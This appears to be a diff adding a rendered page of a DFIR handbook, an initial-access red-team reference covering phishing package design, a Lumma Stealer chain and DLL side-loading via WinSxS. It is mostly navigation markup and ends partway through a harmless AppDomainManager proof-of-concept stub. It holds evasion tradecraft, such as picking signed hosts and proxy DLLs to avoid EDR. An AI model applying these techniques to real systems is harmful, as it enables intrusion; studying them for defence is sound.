+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/kape/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    KAPE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/velociraptor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Velociraptor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/zimmerman-tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Eric Zimmerman Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/plaso-timelines/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Plaso &amp; Super-Timelines
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../playbooks/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Playbooks
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_13" id="__nav_13_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Playbooks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../playbooks/ransomware/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ransomware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../playbooks/compromised-workstation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Compromised Workstation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../playbooks/account-compromise/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Account Compromise &amp; BEC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../playbooks/lateral-domain/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement &amp; Domain Compromise
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../playbooks/data-exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../playbooks/webshell-server/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Shell &amp; Server Compromise
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../learning/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Learning
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_14" id="__nav_14_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Learning
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../learning/roadmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Roadmap
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../learning/purple-team-loop/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Purple-Team Weekly Loop
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../learning/curriculum-24-months/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24-Month Curriculum
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../learning/resources/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Training Resources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contents
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags">
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:initial-access" class="md-tag">initial-access</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:phishing" class="md-tag">phishing</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:redteam" class="md-tag">redteam</a>
+      
+    
+  </nav>
+
+
+  
+    <a href="https://github.com/DFIDwiz-sketch/dfir-handbook/edit/main/docs/redteam/initial-access.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75z"></path></svg>
+    </a>
+  
+  
+    
+      
+    
+    <a href="https://github.com/DFIDwiz-sketch/dfir-handbook/raw/main/docs/redteam/initial-access.md" title="View source of this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5"></path></svg>
+    </a>
+  
+
+
+<h1 id="initial-access-master-reference">Initial Access — Master Reference<a class="headerlink" href="#initial-access-master-reference" title="Permanent link">¶</a></h1>
+<div class="admonition abstract">
+<p class="admonition-title">About this page</p>
+<p>Built on the Initial Access chapter of CRTO (Certified Red Team Operator) study material, then expanded with <strong>per-version Windows 10 / 11 patch status (22H2 · 23H2 · 24H2)</strong>, <strong>realistic viability</strong>, and the latest <strong>evasion trends, OPSEC, and Blue Team / DFIR detection strategy</strong>.
+The emphasis is on <strong>mechanics, patch constraints, and detection/defence</strong> rather than weaponization.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Structure (four parts)</p>
+<ul>
+<li><strong>Part 1</strong> — Phishing taxonomy &amp; host-based payloads (DLL Side-Loading, .NET AppDomainManager)</li>
+<li><strong>Part 2</strong> — Installer and Office payloads (MSI, Excel Add-In, code-signing policy changes, GadgetToJScript droppers)</li>
+<li><strong>Part 3</strong> — Evolution of triggers and anti-sandbox (Batch tricks, LNK vulnerabilities and patches, GrimResource/MSC)</li>
+<li><strong>Part 4</strong> — Containers (MotW bypass matrix) &amp; Delivery (HTML/SVG Smuggling, site cloning) + current trends</li>
+</ul>
+</div>
+<h2 id="contents">Contents<a class="headerlink" href="#contents" title="Permanent link">¶</a></h2>
+<ul>
+<li><a href="#overview">1. Overview &amp; phishing payload taxonomy</a></li>
+<li><a href="#payloads">2. Payloads — DLL Side-Loading / AppDomainManager</a></li>
+<li><a href="#part2">2.3–2.6 Installer · Office · code signing · droppers (Part 2)</a></li>
+<li><a href="#triggers">3. Triggers — Batch / LNK / GrimResource (Part 3)</a></li>
+<li><a href="#containers">4. Containers — MotW bypass matrix (Part 4)</a></li>
+<li><a href="#delivery">5. Delivery — HTML/SVG Smuggling · site cloning</a></li>
+<li><a href="#trends">6. Appendix — 2025~2026 current initial-access trends</a></li>
+</ul>
+<hr>
+<p><a id="overview"></a></p>
+<h1 id="chapter-05-initial-access-part-1">Chapter 05. Initial Access (Part 1)<a class="headerlink" href="#chapter-05-initial-access-part-1" title="Permanent link">¶</a></h1>
+<h2 id="1-overview-phishing-payload-taxonomy">1. Overview &amp; phishing payload taxonomy<a class="headerlink" href="#1-overview-phishing-payload-taxonomy" title="Permanent link">¶</a></h2>
+<h3 id="11-a-modern-definition-of-initial-access">1.1 A modern definition of Initial Access<a class="headerlink" href="#11-a-modern-definition-of-initial-access" title="Permanent link">¶</a></h3>
+<p>Initial Access (MITRE ATT&amp;CK: TA0001) is the tactic of establishing the first foothold inside a target network. Attackers do sometimes exploit externally exposed servers (VPNs, web servers) or carry out supply-chain compromises, but the most common and effective route is still <strong>social engineering via spear phishing</strong>.</p>
+<p>In the past it was enough to email a <code>report.exe</code> or a macro-laden <code>.doc</code>. Against a modern layered defence (email sandboxes, MotW, EDR, ASR rules) those are blocked instantly. Today's operator therefore has to combine several techniques into a multi-stage infection chain that disrupts automated analysis by security products and slows down reverse engineering by the DFIR analyst.</p>
+<h3 id="12-the-five-components-of-a-phishing-package">1.2 The five components of a phishing package<a class="headerlink" href="#12-the-five-components-of-a-phishing-package" title="Permanent link">¶</a></h3>
+<p>The payload taxonomy formalised by security researcher Mariusz Banach gives the most standard framework for designing an initial-access package:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>DELIVERY( CONTAINER( TRIGGER + PAYLOAD + DECOY ) )
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Role</th>
+<th>Traditional (past)</th>
+<th>Modern red-team trend (present)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1. Delivery</strong></td>
+<td>The means of getting the package past perimeter security (firewall, web proxy, email gateway) to the victim</td>
+<td>Direct email attachment, plain HTTP download link</td>
+<td><strong>HTML Smuggling, SVG Smuggling</strong>, abuse of legitimate cloud storage (OneDrive, SharePoint), messenger (Teams) phishing</td>
+</tr>
+<tr>
+<td><strong>2. Container</strong></td>
+<td>A compression/disk format that bundles the files (trigger, payload, decoy), eases delivery, and <strong>blocks MotW (Mark-of-the-Web) propagation</strong> or adds encryption</td>
+<td><code>.zip</code>, <code>.rar</code></td>
+<td><code>.iso</code>, <code>.img</code>, <code>.vhd/.vhdx</code>, <code>.wim</code>, <code>.7z</code>, WebDAV shares</td>
+</tr>
+<tr>
+<td><strong>3. Trigger</strong></td>
+<td>The file the victim directly interacts with (double-click) after opening the container, kicking off payload execution</td>
+<td><code>.exe</code>, Word/Excel macros (<code>.docm</code>, <code>.xlsm</code>)</td>
+<td><strong><code>.lnk</code> (shortcut)</strong>, <code>.bat/.cmd</code>, <code>.msc</code>, legitimately signed executables (LOLBin / side-loading hosts)</td>
+</tr>
+<tr>
+<td><strong>4. Payload</strong></td>
+<td>The malicious code that actually runs on the victim (or a dropper/loader that fetches the final payload)</td>
+<td>A single malicious <code>.exe</code>, a PowerShell one-liner</td>
+<td><strong>Malicious <code>.dll</code> (for side-loading)</strong>, <code>.xlam</code>, encrypted shellcode files (<code>.bin</code>, <code>.dat</code>), .NET assemblies</td>
+</tr>
+<tr>
+<td><strong>5. Decoy</strong></td>
+<td>A benign file shown right after the trigger fires, so the victim believes they opened a normal document</td>
+<td>None (nothing happens, or a fake error window)</td>
+<td>A legitimate <code>.pdf</code>, <code>.xlsx</code>, <code>.docx</code> that fits the pretext perfectly (must keep the same format as the trigger's icon)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="13-a-real-attack-chain-case-study-lumma-stealer-campaign">1.3 A real attack chain (Case study: Lumma Stealer campaign)<a class="headerlink" href="#13-a-real-attack-chain-case-study-lumma-stealer-campaign" title="Permanent link">¶</a></h3>
+<p>A representative chain showing how real threat groups combine the components to evade security products:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>[Victim: downloads a file disguised as a PDF from a website]
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>       │
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>       ▼
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>┌───────────────────┐
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>│  1. Trigger       │  A Windows shortcut (.LNK) disguised with a PDF icon runs
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>└─────────┬─────────┘
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>          │ (invokes)
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>          ▼
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>┌───────────────────┐
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>│  2. LOLBin (1st)  │  wmic.exe or mshta.exe connects to a remote server (80.76.51[.]231)
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>└─────────┬─────────┘
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>          │ (download and run)
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>          ▼
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>┌───────────────────┐
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>│  3. Dropper (2nd) │  Obfuscated JavaScript (.js) -&gt; calls an obfuscated PowerShell script
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>└─────────┬─────────┘
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>          │ (unpack and run hidden)
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>          ▼
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>┌───────────────────┐
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>│  4. Final Payload │  Lumma Stealer (Kompass-4.1.2.exe) runs
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>└─────────┬─────────┘
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>          │ (obtains C2 address - Dead Drop Resolver technique)
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>          ▼
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>┌───────────────────┐
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>│  5. C2 comms      │  Parses an HTML tag ("actual_persona_name") on a Steam community
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>└───────────────────┘  profile page, decrypts the real C2 domain, then communicates
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Update note — per-version Windows validity of this chain</p>
+<ul>
+<li><strong><code>WMIC</code>:</strong> On <strong>Windows 11 (22H2 and later) and upcoming Windows Server</strong>, <code>wmic.exe</code> has been removed from the default install (deprecated / removed on demand). Putting <code>wmic</code> in a trigger chain will therefore fail against a current Windows 11 target.</li>
+<li><strong><code>mshta.exe</code> and <code>JavaScript</code>:</strong> These are the top target of default detection rules in modern EDR (e.g. Microsoft Defender for Endpoint) and of ASR (Attack Surface Reduction) rules. Modern operators therefore favour <strong>DLL side-loading</strong> (below) over script engines.</li>
+</ul>
+</div>
+<hr>
+<p><a id="payloads"></a></p>
+<h2 id="2-payloads-in-detail-and-brought-up-to-date">2. Payloads in detail (and brought up to date)<a class="headerlink" href="#2-payloads-in-detail-and-brought-up-to-date" title="Permanent link">¶</a></h2>
+<h3 id="21-dll-side-loading-dll-side-loading-abuse-of-winsxs">2.1 DLL Side-Loading (DLL side-loading &amp; abuse of WinSxS)<a class="headerlink" href="#21-dll-side-loading-dll-side-loading-abuse-of-winsxs" title="Permanent link">¶</a></h3>
+<h4 id="core-idea-dll-hijacking-vs-dll-side-loading">Core idea (DLL Hijacking vs. DLL Side-Loading)<a class="headerlink" href="#core-idea-dll-hijacking-vs-dll-side-loading" title="Permanent link">¶</a></h4>
+<p>When a Windows application (<code>.exe</code>) runs and the absolute path to a required dynamic-link library (<code>.dll</code>) is not hard-coded, Windows searches folders in a fixed order (the Standard DLL Search Order):</p>
+<ol>
+<li><strong>The directory the application (<code>.exe</code>) is in (most important ⭐)</strong></li>
+<li>The system directory (<code>C:\Windows\System32</code>)</li>
+<li>The 16-bit system directory (<code>C:\Windows\System</code>)</li>
+<li>The Windows directory (<code>C:\Windows</code>)</li>
+<li>The current working directory</li>
+<li>
+<p>Directories listed in the <code>PATH</code> environment variable</p>
+</li>
+<li>
+<p><strong>DLL Hijacking:</strong> When an already-installed program looks for a DLL that doesn't exist (<code>NAME NOT FOUND</code>), the attacker plants a malicious DLL in a path the standard user can write to (e.g. a sub-folder on <code>PATH</code>). Mostly used for privilege escalation and persistence.</p>
+</li>
+<li><strong>DLL Side-Loading:</strong> <strong>Optimised for initial access.</strong> A legitimately signed <code>.exe</code> (from Microsoft or another trusted vendor) is bundled in the same folder (inside the container) with a malicious <code>.dll</code> named exactly like the one that <code>.exe</code> loads. By search-order rule 1 (the application's own directory), the signed <code>.exe</code> loads the malicious <code>.dll</code> sitting beside it the moment it runs.</li>
+</ol>
+<h4 id="why-target-cwindowswinsxs">Why target <code>C:\Windows\WinSxS</code>?<a class="headerlink" href="#why-target-cwindowswinsxs" title="Permanent link">¶</a></h4>
+<p>Executables in the default system folders (<code>System32</code> etc.) have been hardened over successive patches so they only search safe paths (their own folder, the GAC, and so on). But <code>C:\Windows\WinSxS</code> (the Windows Component Store) is a huge warehouse that keeps <strong>pre-patch, older binary versions</strong> for application compatibility (side-by-side assemblies) and update rollback. In other words, a vulnerable, pre-patch version of a genuinely Microsoft-signed binary that is fixed in the main OS can still be sitting inside <code>WinSxS</code>.</p>
+<h4 id="analysis-guide-identifying-a-vulnerable-binary-in-winsxs">[Analysis guide] Identifying a vulnerable binary in WinSxS<a class="headerlink" href="#analysis-guide-identifying-a-vulnerable-binary-in-winsxs" title="Permanent link">¶</a></h4>
+<p><strong>Step 1. Observe the behaviour of the current binary (<code>ngentask.exe</code>)</strong> — Run the current <code>ngentask.exe</code> from its default path and watch it with Sysinternals Process Monitor (ProcMon).</p>
+<ul>
+<li>ProcMon filters:<ul>
+<li><code>Process Name</code> <code>is</code> <code>ngentask.exe</code></li>
+<li><code>Path</code> <code>ends with</code> <code>.dll</code></li>
+<li><code>Result</code> <code>is</code> <code>NAME NOT FOUND</code></li>
+</ul>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>C:\Users\Analyst&gt; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe
+</span></code></pre></div>
+<blockquote>
+<p><strong>Result:</strong> You see DLLs it can't find, but it only searches inside <code>C:\Windows\Microsoft.NET\Framework64\...</code> and the GAC (Global Assembly Cache) — it never looks in external folders, so hijacking is hard.</p>
+</blockquote>
+<p><strong>Step 2. Find an older <code>ngentask.exe</code> in <code>WinSxS</code></strong> — Use PowerShell to search for older versions kept inside the <code>WinSxS</code> directory.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">WinSxS</span> <span class="n">-Recurse</span> <span class="n">-Filter</span> <span class="n">ngentask</span><span class="p">.</span><span class="n">exe</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">FullName</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">WinSxS</span><span class="p">\</span><span class="n">amd64_netfx4-ngentask_exe_</span><span class="p">...</span><span class="n">_4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">15805</span><span class="p">.</span><span class="n">0_</span><span class="p">...\</span><span class="n">ngentask</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">WinSxS</span><span class="p">\</span><span class="n">amd64_netfx4-ngentask_exe_</span><span class="p">...</span><span class="n">_4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">15805</span><span class="p">.</span><span class="n">285_</span><span class="p">...\</span><span class="n">ngentask</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">...</span>
+</span></code></pre></div>
+<p><strong>Step 3. Run the older version and check its search order</strong> — Run the older binary and watch ProcMon again. The older version follows the standard search order to find <code>mscorsvc.dll</code> and tries to load it from the current working directory (<code>NAME NOT FOUND</code>). That location is the spot vulnerable to side-loading.</p>
+<h4 id="advanced-higher-reliability-side-loading-concepts-for-real-operations">[Advanced] Higher-reliability side-loading concepts for real operations<a class="headerlink" href="#advanced-higher-reliability-side-loading-concepts-for-real-operations" title="Permanent link">¶</a></h4>
+<p>Beyond simply firing from <code>DllMain</code>, two concepts matter for reliability and success rate in a real engagement:</p>
+<ol>
+<li><strong>DLL Proxying / Forwarding:</strong> When the legitimate program loads the DLL and immediately calls a specific export, a replacement DLL that lacks that export causes the program to crash — the victim notices, and a crash dump lands in the EDR telemetry. A proxy DLL (e.g. <code>SharpDllProxy</code>) forwards the program's legitimate function calls to the real system DLL (<code>C:\Windows\System32\...</code>) so the program keeps running normally while the malicious code runs on a background thread.</li>
+<li><strong>Third-party signed binaries:</strong> When a Microsoft default binary (e.g. <code>ngentask.exe</code>) runs from an unusual path (e.g. <code>Downloads</code>), modern EDR gets suspicious. Operators therefore increasingly use older signed executables from NVIDIA, Adobe, Cisco, VLC, etc. as the host — third-party programs legitimately install in many locations, so they evade path-based heuristics far better. (Reference database: <strong>HijackLibs.net</strong>)</li>
+</ol>
+<h3 id="22-net-appdomainmanager-injection">2.2 .NET AppDomainManager Injection<a class="headerlink" href="#22-net-appdomainmanager-injection" title="Permanent link">¶</a></h3>
+<h4 id="core-idea">Core idea<a class="headerlink" href="#core-idea" title="Permanent link">¶</a></h4>
+<p>Independent of DLL search order, <strong>every application written in the .NET Framework</strong> has an official feature to specify the <code>AppDomainManager</code> it will use at startup. The technique: create a .NET assembly (DLL) that inherits from <code>System.AppDomainManager</code>, then use an environment variable or a <code>.config</code> file to tell a legitimate .NET executable "load this DLL as your manager when you run."</p>
+<h4 id="concept-example-structure-of-a-custom-appdomainmanager">[Concept example] Structure of a custom AppDomainManager<a class="headerlink" href="#concept-example-structure-of-a-custom-appdomainmanager" title="Permanent link">¶</a></h4>
+<p><strong>Step 1. .NET Framework class library (PoC only — just shows a MessageBox)</strong></p>
+<div class="language-csharp highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">using</span><span class="w"> </span><span class="nn">System</span><span class="p">;</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">using</span><span class="w"> </span><span class="nn">System.Windows.Forms</span><span class="p">;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="k">namespace</span><span class="w"> </span><span class="nn">AppDomainHijack</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="p">{</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">    </span><span class="c1">// A public class that inherits from AppDomainManager</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="k">public</span><span class="w"> </span><span class="k">sealed</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">DomainManager</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">AppDomainManager</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">    </span><span class="p">{</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">        </span><span class="c1">// Override the method called automatically when the domain initialises</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">        </span><span class="k">public</span><span class="w"> </span><span class="k">override</span><span class="w"> </span><span class="k">void</span><span class="w"> </span><span class="nf">InitializeNewDomain</span><span class="p">(</span><span class="n">AppDomainSetup</span><span class="w"> </span><span class="n">appDomainInfo</span><span class="p">)</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">        </span><span class="p">{</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">            </span><span class="c1">// PoC — in a real engagement a loader would go here; this document is for understanding the mechanism</span>
